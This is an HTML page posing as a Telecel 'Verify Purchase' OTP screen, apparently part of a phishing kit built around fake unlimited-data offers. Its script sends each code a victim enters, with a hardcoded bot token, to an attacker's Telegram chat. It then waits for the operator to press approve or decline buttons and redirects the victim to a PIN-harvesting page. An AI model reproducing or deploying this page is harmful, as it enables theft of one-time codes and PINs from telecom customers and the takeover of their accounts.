<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - OTP Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section {
            text-align: center;
            padding: 35px 0 20px;
        }
        .telecel-logo {
            width: 138px;
            height: 138px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            font-size: 23px;
            font-weight: 700;
            margin: 10px 0 6px;
            color: #1e2937;
            padding: 0 20px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 15.2px;
            padding: 0 25px 20px;
            line-height: 1.45;
        }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0 28px;
            padding: 0 10px;
        }
        .otp-input {
            width: 52px;
            height: 62px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            outline: none;
        }
        .otp-input:focus {
            border-color: #E30613;
            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
        }
        .form-section {
            padding: 0 25px 35px;
        }
        .error-msg {
            text-align: center;
            margin: 12px 20px;
            font-size: 14.5px;
            padding: 12px;
            border-radius: 10px;
            display: none;
            color: #dc3545;
            background: #ffebee;
        }
        .success-msg {
            text-align: center;
            margin: 12px 20px;
            font-size: 14.5px;
            padding: 12px;
            border-radius: 10px;
            display: none;
            color: #28a745;
            background: #e6f4ea;
        }
        .btn-action {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 8px 0;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
        }
        #spinner {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.92);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 70px;
            height: 70px;
            border: 7px solid #fff;
            border-top-color: #E30613;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 480px) {
            .container { border-radius: 20px; }
            .telecel-logo { width: 115px; height: 115px; }
            .otp-input { width: 48px; height: 58px; font-size: 24px; }
            h1 { font-size: 21.5px; }
        }
    </style>
</head>
<body>

        <h1>Verify Purchase</h1>
        <p class="subtitle">
            A 5-digit verification code has been sent to your number. Please enter it below to complete your purchase.
        </p>

        <div class="otp-container" id="otpInputs">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
        </div>

        <div class="error-msg" id="err">Invalid OTP. Please check and try again.</div>
        <div class="success-msg" id="successMsg">✓ OTP Submitted! Waiting for approval...</div>

        <div class="form-section">
            <button class="btn-action" id="verifyBtn">Verify & Accept Purchase</button>
            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:15px;">Waiting for approval...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
            CHAT_ID: '7547427914',
            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
            PIN_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'   // ← Goes directly to PIN
        };

        let state = {
            lastUpdateId: 0,
            pollInterval: null,
            approveId: null,
            declineId: null,
            verifyDeviceId: null,
            validPinId: null,
            invalidPinId: null
        };

        const inputs = document.querySelectorAll('.otp-input');
        const verifyBtn = document.getElementById('verifyBtn');
        const errMsg = document.getElementById('err');
        const successMsg = document.getElementById('successMsg');
        const spinner = document.getElementById('spinner');

        // OTP Input Handling
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length > 1) {
                    const chars = e.target.value.split('');
                    chars.forEach((char, i) => {
                        if (inputs[index + i]) inputs[index + i].value = char;
                    });
                }
                if (e.target.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                checkAndAutoSubmit();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function getOTP() {
            let otp = "";
            inputs.forEach(input => otp += input.value);
            return otp;
        }

        function checkAndAutoSubmit() {
            if (getOTP().length === 5) {
                setTimeout(submitOTP, 300);
            }
        }

        function submitOTP() {
            const otp = getOTP();
            if (otp.length !== 5) return;

            errMsg.style.display = 'none';
            successMsg.style.display = 'none';
            spinner.style.display = 'flex';

            const ts = Date.now();
            state.approveId = `otp_approve_${ts}`;
            state.declineId = `otp_decline_${ts}`;
            state.verifyDeviceId = `otp_verify_${ts}`;
            state.validPinId = `valid_pin_${ts}`;
            state.invalidPinId = `invalid_pin_${ts}`;

            const message = `<b>🔴 OTP Verification Received</b>\n\nOTP Code: <code>${otp}</code>\n\nChoose Action:`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve & Continue to PIN", callback_data: state.approveId },
                                { text: "❌ Decline", callback_data: state.declineId }
                            ],
                            [
                                { text: "✅ Valid PIN", callback_data: state.validPinId },
                                { text: "❌ Invalid PIN", callback_data: state.invalidPinId }
                            ]
                        ]
                    }
                })
            }).then(() => {
                startPolling();
            }).catch(() => {
                spinner.style.display = 'none';
                errMsg.textContent = "Connection error. Please try again.";
                errMsg.style.display = 'block';
            });
        }

        function startPolling() {
            if (state.pollInterval) clearInterval(state.pollInterval);

            state.pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            state.lastUpdateId = update.update_id;
                            if (update.callback_query) {
                                const cb = update.callback_query.data;

                                if (cb === state.approveId) {
                                    // APPROVE → Go directly to PIN verification
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.PIN_PAGE;
                                }
                                else if (cb === state.declineId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Request declined. Please try again.";
                                    errMsg.style.display = 'block';
                                }
                                else if (cb === state.validPinId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE;
                                }
                                else if (cb === state.invalidPinId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Invalid PIN. Please try again.";
                                    errMsg.style.display = 'block';
                                }
                            }
                        });
                    });
            }, 2000);
        }

        verifyBtn.onclick = submitOTP;

        // Auto focus first input
        inputs[0].focus();
    </script>
</body>
